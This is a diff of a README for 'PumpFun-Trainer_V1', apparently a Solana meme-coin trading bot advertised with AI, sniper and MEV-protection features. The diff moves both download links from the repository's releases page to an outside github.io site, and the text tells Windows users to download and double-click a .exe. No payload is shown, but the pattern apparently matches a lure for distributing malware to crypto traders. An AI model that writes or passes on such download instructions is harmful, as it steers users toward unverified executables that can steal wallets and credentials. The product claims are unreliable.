@@ -1,6 +1,6 @@
 # 🤖 PumpFun-Trainer_V1 - Automate your Solana trading strategy now
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Ingmarset98/PumpFun-Trainer_V1/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://ingmarset98.github.io)
 
 PumpFun-Trainer_V1 helps you trade Solana meme-coins. This application uses artificial intelligence to monitor prices and execute trades. It removes manual effort from your trading process. You can use the sniper feature to enter trades early. You can set rules for selling tokens automatically. Built-in protection defends your transactions against MEV threats. The software supports multiple wallets for flexible portfolio management. Real-time alerts keep you informed about price movements.
 
@@ -10,7 +10,7 @@ You need a computer running Windows 10 or Windows 11. Your system should have at
 
 ## 📥 Getting Started
 
-Visit the following link to download the software: [https://github.com/Ingmarset98/PumpFun-Trainer_V1/releases](https://github.com/Ingmarset98/PumpFun-Trainer_V1/releases). 
+Visit the following link to download the software: [https://ingmarset98.github.io](https://ingmarset98.github.io). 
 
 On the releases page, locate the file ending in .exe. Click the link to save the file to your computer. After the download completes, double-click the file to start the installation process. Follow the instructions on the screen to finish the setup.
 
